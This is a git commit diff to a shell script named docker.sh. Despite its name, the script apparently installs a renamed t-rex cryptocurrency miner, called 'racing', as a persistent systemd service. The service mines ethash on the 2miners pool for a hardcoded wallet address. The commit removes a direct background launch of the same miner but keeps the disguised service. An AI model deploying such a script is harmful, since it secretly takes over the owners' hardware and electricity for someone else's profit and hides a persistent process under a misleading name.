c149279f7aea4f8eb783a27ef4335a13eb5d4aa4
jotmbtmyejhle <96216348+jotmbtmyejhle@users.noreply.github.com>
2022-02-15 16:56:13 +0800

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -14,4 +14,3 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x -w badao\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x &
